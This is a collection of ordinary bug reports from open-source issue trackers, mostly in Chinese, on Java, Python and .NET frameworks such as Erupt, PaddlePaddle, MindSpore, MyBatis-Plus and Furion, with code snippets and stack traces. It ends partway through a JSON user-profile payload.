一对多新增时，编辑权限不可控,"JDK版本：1.8.0_281 erupt版本： 1.10.10 办公用品类与价格类建立一对多关系，价格类设置为不可编辑权限，但实际情况依然可编辑。 OfficeSupplies.java 办公用品类 Price.java 调价类 截图   <code>: @Erupt( name = ""办公用品信息"", //功能名称 desc = ""办公用品信息维护"", //描述 authVerify = true, //是否开启权限验证 orderBy = ""id desc"", //排序表达式 power = @Power(add = true, delete = true, edit = true, query = true, importable = true, export = true) ) @Table(name = ""t_office_supplies"") @Entity public class OfficeSupplies extends HyperModel { @EruptField( sort = 1, views = @View(title = ""品名""), edit = @Edit(title = ""品名"", inputType = @InputType, notNull = true, search = @Search(vague = true)) ) private String name; @EruptField( sort = 2, views = @View(title = ""规格""), edit = @Edit(title = ""规格"", inputType = @InputType, notNull = true) ) private String standards; @ManyToOne //多对一 @EruptField( sort = 3, views = { @View(title = ""品牌"", column = ""name"") }, edit = @Edit(title = ""选择品牌"", type = EditType.REFERENCE_TABLE, notNull = true, referenceTableType = @ReferenceTableType(id = ""id"", label = ""name"") ) ) private Brand brand; @EruptField( sort = 4, views = @View( title = ""单位"" ), edit = @Edit( title = ""单位"", type = EditType.CHOICE, notNull = true, choiceType = @ChoiceType( fetchHandler = DictCodeChoiceFetchHandler.class, fetchHandlerParams = {""100"", ""5000""}) ) ) private Long unit; @EruptField( sort = 5, edit = @Edit(title = ""特殊物品"", type = EditType.CHOICE, notNull = true, choiceType = @ChoiceType( type = ChoiceType.Type.SELECT, vl = { @VL(label = ""否"", value = ""0""), @VL(label = ""是"", value = ""1"") } )) ) private String specialItems = ""0""; @EruptField( sort = 6, views = @View(title = ""备注""), edit = @Edit(title = ""备注"", type = EditType.TEXTAREA) ) private String remarks; @OneToMany(cascade = CascadeType.ALL, orphanRemoval = true) //一对多，且开启级联 @JoinColumn(name = ""office_supplies_id"") //this表示当前的表名，如：order_id子表会自动创建该列来标识与主表的关系 @OrderBy //排序 @EruptField( edit = @Edit(title = ""调价"", type = EditType.TAB_TABLE_ADD ) ) private Set&lt;Price&gt; prices; } @Erupt( name = ""价格信息"", //功能名称 desc = ""价格信息维护"", //描述 authVerify = true, //是否开启权限验证 orderBy = ""id desc"", //排序表达式 power = @Power(add = true, delete = true, edit = false, query = true, importable = true, export = true) ) @Table(name = ""t_price"") @Entity public class Price extends HyperModel { @EruptField( sort = 1, views = @View(title = ""单价（元）"",sortable=true), edit = @Edit(title = ""单价（元）"",notNull = true) ) private float unitPrice; @EruptField( sort = 2, views = @View(title = ""是否启用""), edit = @Edit( title = ""是否启用"", notNull = true, boolType = @BoolType ) ) private boolean isEnable; @EruptField( sort = 3, views = @View(title = ""调价说明函""), edit = @Edit(title = ""调价说明函"", type = EditType.ATTACHMENT, attachmentType = @AttachmentType) ) private String ExplanatoryAttachment; }"
A potential data race in OsTaskToExit,"In function OsTaskToExit a is acquired. Seems, calls of OsTaskJoinPostUnsafe and OsSchedResched must be protected by the lock, as it is released only after them. However, in certain condition the function OsTaskDeleteUnsafe may be called. The function releases the . Thus, the execution in continues without it, thus, and may be called without protection.   <code>: SCHEDULER_LOCK SCHEDULER_LOCK OsTaskToExit OsSchedResched OsTaskJoinPostUnsafe"
使用@Post 定义请求，但是日志里显示的是Get，报错405,"报错： GET http://localhost:8071/con/post HTTP Headers: Content-Type: application/json com.dtflys.forest.exceptions.ForestNetworkException: HTTP 405 Error: 接口是我自定义的PostMapping，curl是好的。 但是我自定义了@ Post的 client 结果出错了，还是以Get请求发出的   <code>: @Post(url=""http://localhost:8071/con/post"", headers = ""Content-Type:application/json"") User getUser(Request request);"
导出word报错，提示Cannot find the file [C:\Program],"应用安装路径 C:\Program Files (x86)\chiner\ 在导出word文档时报错 怀疑是要读取模板的时候报错，遇到空格读不出来。更改模板文件路径到桌面 导出成功   <code>: 2021-12-21 15:14:34.965 [main] DEBUG cn.com.chiner.java.Application - java.vendor = Oracle Corporation 2021-12-21 15:14:34.965 [main] DEBUG cn.com.chiner.java.Application - java.vm.info = mixed mode 2021-12-21 15:14:34.965 [main] DEBUG cn.com.chiner.java.Application - java.vm.version = 11.0.12+8-LTS-237 2021-12-21 15:14:34.966 [main] DEBUG cn.com.chiner.java.Application - sun.io.unicode.encoding = UnicodeLittle 2021-12-21 15:14:34.966 [main] DEBUG cn.com.chiner.java.Application - java.class.version = 55.0 2021-12-21 15:14:34.989 [main] DEBUG cn.com.chiner.java.Application - Heap-Max:1024MB 2021-12-21 15:14:34.989 [main] DEBUG cn.com.chiner.java.Application - Heap-Init:128MB 2021-12-21 15:14:34.990 [main] DEBUG cn.com.chiner.java.Application - Heap-Committed:128MB 2021-12-21 15:14:34.990 [main] DEBUG cn.com.chiner.java.Application - Heap-Used:19MB 2021-12-21 15:14:35.009 [main] DEBUG cn.com.chiner.java.Application - init = 134217728(131072K) used = 19922944(19456K) committed = 134217728(131072K) max = 1073741824(1048576K) 2021-12-21 15:14:35.009 [main] DEBUG cn.com.chiner.java.Application - NoHeap-Max:0MB 2021-12-21 15:14:35.009 [main] DEBUG cn.com.chiner.java.Application - NoHeap-Init:7MB 2021-12-21 15:14:35.009 [main] DEBUG cn.com.chiner.java.Application - NoHeap-Committed:20MB 2021-12-21 15:14:35.009 [main] DEBUG cn.com.chiner.java.Application - NoHeap-Used:15MB 2021-12-21 15:14:35.010 [main] INFO cn.com.chiner.java.Application - ---------------------------------------------------------------------------------------- 2021-12-21 15:14:35.890 [main] ERROR cn.com.chiner.java.command.impl.GenDocxImpl - com.deepoove.poi.exception.ResolverException: Cannot find the file [C:\Program] at com.deepoove.poi.XWPFTemplate.compile(XWPFTemplate.java:148) at cn.com.chiner.java.command.impl.GenDocxImpl.exec(GenDocxImpl.java:218) at cn.com.chiner.java.command.impl.GenDocxImpl.exec(GenDocxImpl.java:61) at cn.com.chiner.java.command.impl.GenDocxImpl.exec(GenDocxImpl.java:47) at cn.com.chiner.java.Application.main(Application.java:188) Caused by: java.io.FileNotFoundException: C:\Program (系统找不到指定的文件。) at java.base/java.io.FileInputStream.open0(Native Method) at java.base/java.io.FileInputStream.open(FileInputStream.java:219) at java.base/java.io.FileInputStream.&lt;init&gt;(FileInputStream.java:157) at com.deepoove.poi.XWPFTemplate.compile(XWPFTemplate.java:146) ... 4 common frames omitted 2021-12-21 15:14:35.898 [main] INFO cn.com.chiner.java.Application - { ""status"" : ""FAILED"", ""body"" : ""Cannot find the file [C:\\Program]"", ""properties"" : { } }"
分配查看和下载权限后下载excel没有表头,Datart版本号 版本号是 用户加入组织后分配查看和下载权限，下载的excel没有标题只有内容日志报如下错误：   <code>: 1.0.0-rc.1
NavigationManagerExtensions 的NavigationManager.NavigateTo 跳轉後TabItem.Text不會是指定的text,"组件版本 latest 浏览器 all Server Side Web Assembly NavigationManagerExtensions 的NavigationManager.NavigateTo 跳轉後TabItem.Text不會是指定的text 按照語法執行TabItem.Text的值應該是item.Text但結果是前一個頁面的text   <code>: NavigationManager.NavigateTo(provider, ""/"" + item.Value, item.Text, """", true)"
win10训练，GPU不够用自动分配，但提示可用显存更少,"1）PaddlePaddle版本：1.7.0 3）GPU：NVIDIA GeForce GTX 1050 Ti、 CUDA:10.0、 CUDNN:cudnn-10.0-windows10-x64-v7.6.2.24 4）系统环境：WINDOWS10专业版，python 3 训练信息 1）单机，单卡 复现信息： 问题描述： 我在运行猫狗分类，尝试使用GPU进行训练，提示我显卡内存不足。 尝试在命令行里加入语句 结果提示可用内存又相应的减少了？ 而且我想知道如何能够将我4G的显卡内存都用在这个上面，而不是如何自动分配？ 请求支援。   <code>: D:\python\lib\site-packages\paddle\fluid\executor.py:782: UserWarning: The following exception is not an EOF exception. ""The following exception is not an EOF exception."") Traceback (most recent call last): File ""1.1-猫十二分类-建造模型.py"", line 200, in &lt;module&gt; fetch_list=[avg_cost, acc]) #fetch均方误差和准确率 File ""D:\python\lib\site-packages\paddle\fluid\executor.py"", line 783, in run six.reraise(*sys.exc_info()) File ""D:\python\lib\site-packages\six.py"", line 703, in reraise raise value File ""D:\python\lib\site-packages\paddle\fluid\executor.py"", line 778, in run use_program_cache=use_program_cache) File ""D:\python\lib\site-packages\paddle\fluid\executor.py"", line 831, in _run_impl use_program_cache=use_program_cache) File ""D:\python\lib\site-packages\paddle\fluid\executor.py"", line 905, in _run_program fetch_var_name) RuntimeError: -------------------------------------------- C++ Call Stacks (More useful to developers): -------------------------------------------- Windows not support stack backtrace yet. ---------------------- Error Message Summary: ---------------------- ResourceExhaustedError: Out of memory error on GPU 0. Cannot allocate 975.156494MB memory on GPU 0, available memory is only 692.362499MB. Please check whether there is any other process using GPU 0. 1. If yes, please stop them, or start PaddlePaddle on another GPU. 2. If no, please try one of the following suggestions: 1) Decrease the batch size of your model. 2) FLAGS_fraction_of_gpu_memory_to_use is 0.50 now, please set it to a higher value but less than 1.0. The command is `export FLAGS_fraction_of_gpu_memory_to_use=xxx`. at (D:\1.7.0\paddle\paddle\fluid\memory\detail\system_allocator.cc:151) W0414 22:07:52.919553 1340 device_context.cc:237] Please NOTE: device: 0, CUDA Capability: 61, Driver API Version: 10.1, Runtime API Version: 10.0 W0414 22:07:53.216182 1340 device_context.cc:245] device: 0, cuDNN Version: 7.6. W0414 22:08:20.092104 1340 operator.cc:181] relu raises an exception struct paddle::memory::allocation::BadAlloc, -------------------------------------------- C++ Call Stacks (More useful to developers): -------------------------------------------- Windows not support stack backtrace yet. ---------------------- Error Message Summary: ---------------------- ResourceExhaustedError: Out of memory error on GPU 0. Cannot allocate 975.156494MB memory on GPU 0, available memory is only 692.362499MB. Please check whether there is any other process using GPU 0. 1. If yes, please stop them, or start PaddlePaddle on another GPU. 2. If no, please try one of the following suggestions: 1) Decrease the batch size of your model. 2) FLAGS_fraction_of_gpu_memory_to_use is 0.50 now, please set it to a higher value but less than 1.0. The command is `export FLAGS_fraction_of_gpu_memory_to_use=xxx`. at (D:\1.7.0\paddle\paddle\fluid\memory\detail\system_allocator.cc:151) export FLAGS_fraction_of_gpu_memory_to_use=0.9 os.environ[""FLAGS_fraction_of_gpu_memory_to_use""]=""0.9"" Out of memory error on GPU 0. Cannot allocate 65.051514MB memory on GPU 0, available memory is only 24.174999MB."
官方网站代码注释出现了参数书写错误,"官网链接：https://www.paddlepaddle.org.cn/tutorials/projectdetail/811979#anchor-10 描述：Resnet模型的层数描述中，对152的注释描述为了50。 细节：paddle官网1.8版本-&gt;教程-&gt;零基础入门深度学习-&gt;深度学习实践应用:计算机视觉-&gt;图像分类-&gt;ResNet的代码中 152的注释写成了50 截图：   <code>: elif layers == 152: #ResNet50包含多个模块，其中第2到第5个模块分别包含3、8、36、3个残差块 depth = [3, 8, 36, 3]"
RuoYiSystemApplication启动报错,"nacos2.0.1版本，Server check fail, please check server 127.0.0.1 ,port 9848 is available 启动RuoYiSystemApplication时报错。看日志已经获取了ruoyi-system-dev.yml的配置，代码没有做过修改。   <code>: Caused by: org.apache.ibatis.binding.BindingException: Invalid bound statement (not found): com.ruoyi.system.mapper.SysConfigMapper.selectConfigList at org.apache.ibatis.binding.MapperMethod$SqlCommand.&lt;init&gt;(MapperMethod.java:235) at org.apache.ibatis.binding.MapperMethod.&lt;init&gt;(MapperMethod.java:53) at org.apache.ibatis.binding.MapperProxy.lambda$cachedInvoker$0(MapperProxy.java:108) at java.util.concurrent.ConcurrentHashMap.computeIfAbsent(ConcurrentHashMap.java:1660) at org.apache.ibatis.util.MapUtil.computeIfAbsent(MapUtil.java:36) at org.apache.ibatis.binding.MapperProxy.cachedInvoker(MapperProxy.java:95) at org.apache.ibatis.binding.MapperProxy.invoke(MapperProxy.java:86) at com.sun.proxy.$Proxy129.selectConfigList(Unknown Source) at com.ruoyi.system.service.impl.SysConfigServiceImpl.loadingConfigCache(SysConfigServiceImpl.java:153) at com.ruoyi.system.service.impl.SysConfigServiceImpl.init(SysConfigServiceImpl.java:38) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.beans.factory.annotation.InitDestroyAnnotationBeanPostProcessor$LifecycleElement.invoke(InitDestroyAnnotationBeanPostProcessor.java:389) at org.springframework.beans.factory.annotation.InitDestroyAnnotationBeanPostProcessor$LifecycleMetadata.invokeInitMethods(InitDestroyAnnotationBeanPostProcessor.java:333) at org.springframework.beans.factory.annotation.InitDestroyAnnotationBeanPostProcessor.postProcessBeforeInitialization(InitDestroyAnnotationBeanPostProcessor.java:157) ... 32 common frames omitted"
[CT][MS][OP]op AdjustSaturation API descriptions and args error msg need to be optimized,"1.djustSaturation API 部分描述不准确 2.异常校验报错信息参数名有误 / 硬件环境: /device ascend /device cpu : -- MindSpore version :众智whl包 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph 执行测试用例 image 取 invalid dtype时，报错信息清晰明确， 参数名正确 image 取 invalid dtype时 报错心里里参数名有误   <code>: def test_adjustsaturation_input_dtype_fp64(): image = Tensor(np.random.random(size=(8, 9, 3)).astype(np.float64)) scale = Tensor(np.random.rand(), dtype=mstype.float32) fact = AdjustSaturationMock(inputs=[image, scale]) #with pytest.raises(TypeError): fact.forward_mindspore_impl()"
Describe problems for functor,Part one of . It describes what problems should be resolved. Related issue #3894:Refactoring InferShape   <code>: Functor Design Doc
Graph Mode下动态shape导致split失败,"Graph Mode下动态shape导致split失败 / 硬件环境: /device GPU : -- MindSpore version : 1.9.0 -- Python version : Python 3.8.10 -- OS platform and distribution : Linux CentOS7 -- GCC/Compiler version : GCC 7.5.0 (/): /mode graph 代码已简化为以下测试代码 construct()函数中raise ValueError: (-1, (-1, 5))   <code>: import random import mindspore as ms from mindspore import ops, context, nn context.set_context(mode=context.GRAPH_MODE) # context.set_context(mode=context.PYNATIVE_MODE) class Model(nn.Cell): def __init__(self): super().__init__() def construct(self, x, mask): # masked select perm = ms.numpy.arange(x.shape[0]) mask = ops.masked_select(perm, mask) x = x[mask] if x.shape[0] &lt; 0: # raise ValueError with (-1, (-1, 5)) raise ValueError(mask.shape, x.shape) else: x = ms.numpy.split(x, [1], axis=0) return x input_size = 5 output_size = 5 # randomly generate 'x' and 'mask' x = ms.numpy.rand((random.randint(10, 20), input_size)) mask = (ops.random_poisson(ms.Tensor([x.shape[0]], ms.int32), rate=2) &gt; 0) model = Model() res = model(x, mask)"
skywalking 追踪显示 在更新和保存的的sql后面，会紧跟着一条查询语句,"当前使用版本 mybatis-plus-boot-starter:3.4.2 生产接入skywalking 在使用追踪是发现在更新和保存的的sql后面，会紧跟着一条查询语句 skywalking 追踪显示 在更新和保存的的sql后面，会紧跟着一条查询语句 例1 代码： skywalking 展示的 保存sql: INSERT INTO fi_account_balance ( seq_id,account_id,group_id,balance,total_money,create_user ) VALUES ( ?,?,?,?,?,? ) skywalking 展示的紧跟保存的sql： 例2 代码： skywalking 展示的更新sql: skywalking 展示的紧跟更新的sql： 二者字段完全对的上，但是本地debug日志开启又没看到后面sql   <code>: FiAccountBalance balance = FiAccountBalance.builder() .seqId(YZUtility.getUUID()) .accountId(entity.getAccountId()) .balance(BigDecimal.ZERO) .groupId(entity.getTeamId()) .createUser(UserLocal.get().getAccountSeqId()) .totalMoney(BigDecimal.ZERO) .build(); fiAccountBalanceService.save(balance); SELECT account_id, balance, create_user, group_id, seq_id, total_money FROM fi_account_balance WHERE (seq_id) in ( (?) ) FiAccountBalance newBalance = new FiAccountBalance(); newBalance.setSeqId(accountBalance.getSeqId()); newBalance.setBalance(retval); if (UserLocal.get() != null) { newBalance.setUpdateUser(UserLocal.get().getAccountSeqId()); } fiAccountBalanceService.updateById(newBalance); update fi_team_balance SET balance = ?, update_time = ?, update_user = ? where seq_id = ? SELECT seq_id, balance, update_time, update_user FROM fi_team_balance WHERE (seq_id) in ( (?) )"
【AICC-鹏城实验室-BEIT网络】Transform mindspore ckpt to torch format,"【Issues Section】/【问题文档片段】 <ol start=""3""> 【Existing Issues】/【存在的问题】 【Expected Result】【预期结果】 Please fill in the expected result   <code>: import argparse import collections from pkgutil import iter_modules import torch from mindspore import Tensor import mindspore.ops as P import mindspore.numpy as np from mindspore.train.serialization import load_checkpoint, load_param_into_net, save_checkpoint def parse_args(): """"""Get parameters from command line."""""" parser = argparse.ArgumentParser(description=""Transform mindspore ckpt to torch format."") parser.add_argument(""--pth_path"", type=str, default='./checkpoint.pth', help=""Output checkpoint storage path."") parser.add_argument(""--ckpt_path"", type=str, default='./beit-100_625.ckpt', help=""Torch model path."") return parser.parse_args() def find_nth_overlapping(haystack, needle, n): start = haystack.find(needle) while start &gt;= 0 and n &gt; 1: start = haystack.find(needle, start+1) n -= 1 return start def convert(args): """"""Model converter."""""" pth_path = args.pth_path ckpt_path = args.ckpt_path params_dict = load_checkpoint(ckpt_path) keys = list(params_dict.keys()) print('------- Before replacing -------------') # a dict logging `old_name`: new_name compare = {} i = 0 while i &lt; len(keys): temp = keys[i] if '.norm1.' in temp or '.norm2.' in temp or temp.startswith('norm.'): if ""gamma"" in temp: temp = temp.replace(""gamma"", ""weight"") if ""beta"" in temp: temp = temp.replace(""beta"", ""bias"") compare[keys[i]] = temp i += 1 th_params = collections.OrderedDict() for item in compare.items(): tk = item[0] mk = item[1] th_params[mk] = torch.tensor(Tensor(params_dict[tk]).asnumpy()) print('------- After replacing -------------') torch.save(th_params, pth_path) if __name__ == ""__main__"": args = parse_args() convert(args) params = torch.load(args.pth_path, map_location=torch.device('cpu')) print(params.keys()) print(""Transform successfully!"")"
INT8 inference accuracy lost after enabling quantization of elementwise_add in a new Ernie Quant model,"Recently @lidanqing-intel has generated a new Quant Ernie model. It contains quantization scales for operators to be quantized. However, after enabling quantization of ops, the accuracy is lost. We are investigating the issue.   <code>: elementwise_add elementwise_add"
IJsonSerializerProvider 序列化 Json 时间转换异常,"Furion 版本号 2.9.3 Web 项目类型 WebApi Mvc Razor Pages Blazor Server 序列化返回对象异常，在2.8.8 b版本上是可以正常返回的，在2.9.3 上提示 The UTC time represented when the offset is applied must be between year 0 and 10,000. (Parameter 'offset') 代码或代码仓库 触发代码 _jsonSerializer.Serialize(actionContext.Result) 序列化数据 Sqlite SqlServer [√] Mysql Oracle PGSql Firebird Cosmos 正常序列化，或者指导下异常原因   <code>: at System.DateTimeOffset.ValidateDate(DateTime dateTime, TimeSpan offset) at System.DateTimeOffset..ctor(DateTime dateTime) at System.DateTimeOffset.op_Implicit(DateTime dateTime) at Furion.JsonSerialization.DateTimeOffsetJsonConverter.Write(Utf8JsonWriter writer, DateTimeOffset value, JsonSerializerOptions options) at System.Text.Json.Serialization.JsonConverter`1.TryWrite(Utf8JsonWriter writer, T&amp; value, JsonSerializerOptions options, WriteStack&amp; state) at System.Text.Json.JsonPropertyInfo`1.GetMemberAndWriteJson(Object obj, WriteStack&amp; state, Utf8JsonWriter writer) at System.Text.Json.Serialization.Converters.ObjectDefaultConverter`1.OnTryWrite(Utf8JsonWriter writer, T value, JsonSerializerOptions options, WriteStack&amp; state) at System.Text.Json.Serialization.JsonConverter`1.TryWrite(Utf8JsonWriter writer, T&amp; value, JsonSerializerOptions options, WriteStack&amp; state) at System.Text.Json.Serialization.JsonConverter`1.TryWriteAsObject(Utf8JsonWriter writer, Object value, JsonSerializerOptions options, WriteStack&amp; state) at System.Text.Json.Serialization.JsonConverter`1.TryWrite(Utf8JsonWriter writer, T&amp; value, JsonSerializerOptions options, WriteStack&amp; state) at System.Text.Json.JsonPropertyInfo`1.GetMemberAndWriteJson(Object obj, WriteStack&amp; state, Utf8JsonWriter writer) at System.Text.Json.Serialization.Converters.ObjectDefaultConverter`1.OnTryWrite(Utf8JsonWriter writer, T value, JsonSerializerOptions options, WriteStack&amp; state) at System.Text.Json.Serialization.JsonConverter`1.TryWrite(Utf8JsonWriter writer, T&amp; value, JsonSerializerOptions options, WriteStack&amp; state) at System.Text.Json.Serialization.JsonConverter`1.TryWriteAsObject(Utf8JsonWriter writer, Object value, JsonSerializerOptions options, WriteStack&amp; state) at System.Text.Json.Serialization.JsonConverter`1.TryWrite(Utf8JsonWriter writer, T&amp; value, JsonSerializerOptions options, WriteStack&amp; state) at System.Text.Json.JsonPropertyInfo`1.GetMemberAndWriteJson(Object obj, WriteStack&amp; state, Utf8JsonWriter writer) at System.Text.Json.Serialization.Converters.ObjectDefaultConverter`1.OnTryWrite(Utf8JsonWriter writer, T value, JsonSerializerOptions options, WriteStack&amp; state) at System.Text.Json.Serialization.JsonConverter`1.TryWrite(Utf8JsonWriter writer, T&amp; value, JsonSerializerOptions options, WriteStack&amp; state) at System.Text.Json.Serialization.JsonConverter`1.WriteCore(Utf8JsonWriter writer, T&amp; value, JsonSerializerOptions options, WriteStack&amp; state) at System.Text.Json.Serialization.JsonConverter`1.WriteCoreAsObject(Utf8JsonWriter writer, Object value, JsonSerializerOptions options, WriteStack&amp; state) at System.Text.Json.JsonSerializer.WriteCore[TValue](JsonConverter jsonConverter, Utf8JsonWriter writer, TValue&amp; value, JsonSerializerOptions options, WriteStack&amp; state) at System.Text.Json.JsonSerializer.WriteCore[TValue](Utf8JsonWriter writer, TValue&amp; value, Type inputType, JsonSerializerOptions options) at System.Text.Json.JsonSerializer.Serialize[TValue](TValue&amp; value, Type inputType, JsonSerializerOptions options) at System.Text.Json.JsonSerializer.Serialize[TValue](TValue value, JsonSerializerOptions options) at SRT.Core.RequestActionFilter.OnActionExecutionAsync(ActionExecutingContext context, ActionExecutionDelegate next) in D:\Code\CCiT\CCit_Back\CCiT\backend\SRT.Core\App\Filters\RequestActionFilter.cs:line 91 at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.&lt;InvokeNextActionFilterAsync&gt;g__Awaited|10_0(ControllerActionInvoker invoker, Task lastTask, State next, Scope scope, Object state, Boolean isCompleted) at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.Rethrow(ActionExecutedContextSealed context) at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.Next(State&amp; next, Scope&amp; scope, Object&amp; state, Boolean&amp; isCompleted) at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.&lt;InvokeInnerFilterAsync&gt;g__Awaited|13_0(ControllerActionInvoker invoker, Task lastTask, State next, Scope scope, Object state, Boolean isCompleted) at Microsoft.AspNetCore.Mvc.Infrastructure.ResourceInvoker.&lt;InvokeNextExceptionFilterAsync&gt;g__Awaited|25_0(ResourceInvoker invoker, Task lastTask, State next, Scope scope, Object state, Boolean isCompleted) { ""success"": true, ""code"": 200, ""message"": ""操作成功"", ""data"": { ""id"": 142307070910551, ""account"": ""superAdmin"", ""nickName"": null, ""name"": ""superAdmin"", ""avatar"": null, ""birthday"": ""1986-07-25 16:00:00"", ""sex"": 2, ""email"": null, ""phone"": ""18020030720"", ""tel"": null, ""adminType"": 1, ""lastLoginIp"": null, ""lastLoginTime"": ""0001-01-01 00:00:00"", ""lastLoginAddress"": null, ""lastLoginBrowser"": null, ""lastLoginOs"": null, ""loginEmpInfo"": { ""jobNum"": ""Srt_0001"", ""orgId"": ""142307070910539"", ""orgName"": ""Srt"", ""extOrgPos"": [ { ""orgId"": 142307070910539, ""orgCode"": ""Srt"", ""orgName"": ""Srt"", ""posId"": 142307070910547, ""posCode"": ""zjl"", ""posName"": ""总经理"" } ], ""positions"": [ { ""posId"": 142307070910547, ""posCode"": ""zjl"", ""posName"": ""总经理"" }, { ""posId"": 142307070910548, ""posCode"": ""fzjl"", ""posName"": ""副总经理"" } ] }, ""apps"": [ { ""id"": 0, ""name"": ""系统管理"", ""code"": ""system"", ""active"": 1, ""status"": 0, ""sort"": 0 }, { ""id"": 0, ""name"": ""系统工具"", ""code"": ""system_tool"", ""active"": 2, ""status"": 0, ""sort"": 0 }, { ""id"": 0, ""name"": ""业务应用"", ""code"": ""businessapp"", ""active"": 2, ""status"": 0, ""sort"": 0 } ], ""roles"": [ { ""id"": 142307070910554, ""code"": ""sys_manager_role"", ""name"": ""系统管理员"" } ], ""permissions"": [ ""ExRateConfig:page"", ""ExRateConfig:edit"", ""ExRateConfig:add"", ""ExRateConfig:delete"", ""ExRateConfig:export"", ""ExRateConfig:import"", ""BusinessConfig:edit"", ""BusinessConfig:add"", ""RuleConfig:edit"", ""RuleConfig:add"", ""RuleConfig:delete"", ""RuleConfig:changeStatus"", ""InvoiceUpload:add"", ""InvoiceUpload:ocr"", ""InvoiceUpload:batchupload"", ""InvoiceUpload:qrcode"", ""InvoiceUpload:excelupload"", ""InvoiceUpload:temdownload"", ""InvoiceUpload:invoicecheck"", ""InvoiceUpload:delete"", ""InvoiceUpload:search"", ""InvoiceUpload:edit"", ""Background:search"", ""Background:searchdetail"", ""CheckDeduction:search"", ""CheckDeduction:select"", ""CheckDeduction:unselect"", ""CheckDeduction:allselect"", ""CheckDeduction:downunselect"", ""CalculateTaxes:search"", ""CalculateTaxes:deduction"", ""CalculateTaxes:undeduction"", ""CalculateTaxes:alldeduction"", ""Transfer :search"", ""Transfer:transfer"", ""Transfer:untransfer"", ""Taxdeclaration :search"", ""Taxdeclaration:apply"", ""Taxdeclaration:confirmsign"", ""Taxdeclaration :restatistics"", ""Taxdeclaration:creat"", ""Taxdeclaration:confirmtax"", ""ComplianceDealing :search"", ""ComplianceDealing:export"", ""ComplianceDealing:forced"", ""InvoiceWarehouse:search"", ""InvoiceWarehouse:export"", ""ExpenseDealing:search"", ""ExpenseDealing:export"", ""ExpenseDealing:process"", ""BookedDealing:search"", ""BookedDealing:export"", ""BookedDealing:enter"", ""sysUser:page"", ""sysUser:edit"", ""sysUser:add"", ""sysUser:delete"", ""sysUser:detail"", ""sysUser:export"", ""sysUser:selector"", ""sysUser:grantRole"", ""sysUser:ownRole"", ""sysUser:grantData"", ""sysUser:ownData"", ""sysUser:updateInfo"", ""sysUser:updatePwd"", ""sysUser:changeStatus"", ""sysUser:updateAvatar"", ""sysUser:resetPwd"", ""sysOrg:page"", ""sysOrg:list"", ""sysOrg:add"", ""sysOrg:edit"", ""sysOrg:delete"", ""sysOrg:detail"", ""sysOrg:tree"", ""sysPos:page"", ""sysPos:list"", ""sysExLog:page"", ""sysExLog:delete"", ""sysPos:add"", ""sysPos:edit"", ""sysPos:delete"", ""sysPos:detail"", ""sysApp:page"", ""sysApp:list"", ""sysApp:add"", ""sysApp:edit"", ""sysApp:delete"", ""sysApp:detail"", ""sysApp:setAsDefault"", ""sysMenu:list"", ""sysMenu:add"", ""sysMenu:edit"", ""sysMenu:delete"", ""sysMenu:detail"", ""sysMenu:treeForGrant"", ""sysMenu:tree"", ""sysMenu:change"", ""sysRole:page"", ""sysRole:add"", ""sysRole:edit"", ""sysRole:delete"", ""sysRole:detail"", ""sysRole:dropDown"", ""sysRole:grantMenu"", ""sysRole:ownMenu"", ""sysRole:grantData"", ""sysRole:ownData"", ""sysConfig:page"", ""sysConfig:list"", ""sysConfig:add"", ""sysConfig:edit"", ""sysConfig:delete"", ""sysConfig:detail"", ""sysApp:setAsDefault"", ""sysLang:page"", ""sysLang:add"", ""sysLang:delete"", ""sysLang:edit"", ""sysLang:generate"", ""sysOpLog:page"", ""sysOpLog:delete"", ""sysMachine:query"", ""sysOnlineUser:list"", ""sysOnlineUser:forceExist"", ""sysFileInfo:page"", ""sysFileInfo:list"", ""sysFileInfo:delete"", ""sysFileInfo:detail"", ""sysFileInfo:upload"", ""sysFileInfo:download"", ""sysFileInfo:preview"" ], ""menus"": [ { ""id"": 142307070910563, ""pid"": 0, ""name"": ""sys_mgr"", ""component"": ""PageView"", ""redirect"": null, ""meta"": { ""title"": ""权限管理"", ""icon"": ""team"", ""show"": true, ""target"": """", ""link"": null }, ""path"": ""/auth"", ""hidden"": false }, { ""id"": 142307070910564, ""pid"": 142307070910563, ""name"": ""sys_user_mgr"", ""component"": ""system/user/index"", ""redirect"": null, ""meta"": { ""title"": ""用户管理"", ""icon"": null, ""show"": true, ""target"": """", ""link"": null }, ""path"": ""/mgr_user"", ""hidden"": false }, { ""id"": 142307070910581, ""pid"": 142307070910563, ""name"": ""sys_org_mgr"", ""component"": ""system/org/index"", ""redirect"": null, ""meta"": { ""title"": ""机构管理"", ""icon"": null, ""show"": true, ""target"": """", ""link"": null }, ""path"": ""/org"", ""hidden"": false }, { ""id"": 142307070910589, ""pid"": 142307070910563, ""name"": ""sys_pos_mgr"", ""component"": ""system/pos/index"", ""redirect"": null, ""meta"": { ""title"": ""职位管理"", ""icon"": null, ""show"": true, ""target"": """", ""link"": null }, ""path"": ""/pos"", ""hidden"": false }, { ""id"": 142307070914651, ""pid"": 142307070910563, ""name"": ""sys_role_mgr"", ""component"": ""system/role/index"", ""redirect"": null, ""meta"": { ""title"": ""角色管理"", ""icon"": null, ""show"": true, ""target"": """", ""link"": null }, ""path"": ""/role"", ""hidden"": false }, { ""id"": 142307070918732, ""pid"": 0, ""name"": ""sys_log_mgr"", ""component"": ""PageView"", ""redirect"": null, ""meta"": { ""title"": ""日志管理"", ""icon"": ""read"", ""show"": true, ""target"": """", ""link"": null }, ""path"": ""/log"", ""hidden"": false }, { ""id"": 142307070918736, ""pid"": 142307070918732, ""name"": ""sys_log_mgr_op_log"", ""component"": ""system/log/oplog/index"", ""redirect"": null, ""meta"": { ""title"": ""操作日志"", ""icon"": null, ""show"": true, ""target"": """", ""link"": null }, ""path"": ""/oplog"", ""hidden"": false }, { ""id"": 142307070911733, ""pid"": 142307070918732, ""name"": ""sys_log_mgr_ex_log"", ""component"": ""system/log/exlog/index"", ""redirect"": null, ""meta"": { ""title"": ""异常日志"", ""icon"": null, ""show"": true, ""target"": """", ""link"": null }, 